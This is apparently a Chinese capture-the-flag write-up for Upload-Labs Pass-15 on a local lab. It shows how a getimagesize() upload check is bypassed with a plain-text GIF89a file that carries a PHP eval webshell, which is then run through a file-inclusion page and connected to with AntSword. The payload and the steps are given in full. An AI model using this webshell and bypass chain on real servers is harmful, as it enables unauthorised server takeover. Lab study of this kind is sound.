【Upload-Labs】Pass-15 getimagesize 检测与文件包含 Writeup

操作者：何芊宏 | 操作日期：2026.11.03 | 分类：CTF | 标签：Upload-Labs, Web, 文件上传, getimagesize, 文件包含, WebShell

1. 题目信息

  • 平台：Upload-Labs (本地 phpStudy 环境)
  • 分类：Web - 文件上传
  • 题目名称：Pass-15 (getimagesize 检测 + 文件包含)
  • 提示：服务端使用 getimagesize() 验证图片，必须绕过宽高结构检测，并利用 include.php 触发执行。

2. 核心原理与前置分析

本关卡源码通过 getimagesize() 获取图片信息，并利用 image_type_to_extension() 生成后缀名。该检测机制会解析文件结构（宽高），不能仅靠简单的文件头伪造。

后缀名重命名的发现：在使用 CMD 将真实的 .jpg 图片与 PHP 代码拼接后上传，服务器返回的图片地址后缀变成了 .jpeg。这是因为 image_type_to_extension() 遇到 IMAGETYPE_JPEG 类型时，会统一将其转换为标准的 .jpeg 后缀。

包含执行的问题：真实的 JPG 图片内部包含大量二进制乱码。当 include.php 尝试包含该文件时，PHP 引擎解析到乱码字符会导致语法崩溃（抛出 Parse error），从而无法执行尾部的木马代码。

3. 工具配置与操作步骤

工具配置：中国蚁剑

  • URL 地址：http://127.0.0.1:8081/include.php?file=upload/真实文件名.gif
  • 连接密码：cmd；编码：UTF-8。

操作步骤与解析：

第一步：踩坑与验证（真实图片马）

使用 CMD 命令 copy /b 1.jpg + shell.php shell15.jpg 拼接图片马并上传。获取真实路径时发现后缀被强制改为了 .jpeg。

访问 include.php?file=upload/xxx.jpeg，页面报 Parse error。证明虽然成功包含了文件，但图片内部的二进制数据导致 PHP 解析崩溃。

第二步：构造纯文本 GIF 马（正确解法）

为了绕过 getimagesize() 且避免二进制乱码导致解析崩溃，新建文本文档，写入纯文本格式的图片头与 Payload：

GIF89a
<?php @eval($_POST['cmd']); ?>

保存为 test15.gif。

第三步：上传与包含触发

在网页上传 test15.gif。服务器识别文件头为 GIF，成功放行并保持 .gif 后缀。复制真实文件路径（如 2026xxx.gif）。

浏览器访问 http://127.0.0.1:8081/include.php?file=upload/2026xxx.gif，页面正常输出 GIF89a，无报错。

第四步：蚁剑连接

使用蚁剑，URL 填入上述包含地址，密码 cmd，成功连接并获取服务器权限。随后清理上传的文件。

4. 踩坑记录与复盘

  • JPG 后缀被改为 JPEG：对于后缀被意外更改的情况，需明白这是由服务端的 image_type_to_extension 函数机制决定的。必须以复制出来的真实 URL 为准进行操作。
  • 二进制乱码导致包含失败：在利用文件包含执行图片马时，纯文本代码（如伪装的 GIF89a）的容错率远高于拼接的二进制真实图片。真实图片极易触发 PHP 的解析错误。

5. 知识点总结

  • getimagesize 校验绕过：理解函数仅校验文件头及宽高结构的特性，通过构建纯文本的 GIF89a 头部实现欺骗。
  • 文件包含的执行条件：包含的文件内容必须是符合 PHP 语法的纯文本，否则二进制数据会导致语法解析中断，致使 Payload 无法执行。
